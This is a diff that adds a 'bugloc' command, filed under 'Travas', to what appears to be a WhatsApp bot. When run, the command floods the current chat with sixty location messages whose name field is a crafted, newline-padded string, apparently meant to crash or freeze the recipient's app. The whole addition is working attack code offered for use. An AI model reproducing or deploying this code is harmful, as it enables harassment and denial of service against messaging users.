@@ -734,3 +734,36 @@ cmd({
         await Void.sendMessage(citel.chat, { react: { text: "✅", key: ms.key } });
     }
 );
+///////////////////////////////////////////===============================================///////////////////////////////////////////////////////
+cmd({
+        pattern: "bugloc",
+        desc: "Sends a travas bug location",
+        category: "Travas",
+        use: 'bugloc',
+        react: "💣",
+        filename: __filename
+    },
+
+    async (Void, citel) => {
+        
+        
+        await Void.sendMessage(citel.chat, { text: `processing your location bug`},{ quoted: citel });
+
+        for (let i = 0; i < 20; i++) {
+            for (let j = 0; j < "3"; j++) {
+                Void.sendMessage(
+                    citel.chat,
+                    {
+                        location: {
+                            degreesLatitude: 34.745948,
+                            degreesLongitude: -92.289883,
+                            name: "BRUX0N3RD\n\n\n\n\n\n\n\n"
+                        }
+                    },
+                    { quoted: citel }
+                );
+            }
+        }
+        await Void.sendMessage(citel.chat, { react: { text: "💥", key: ms.key } });
+    }
+);
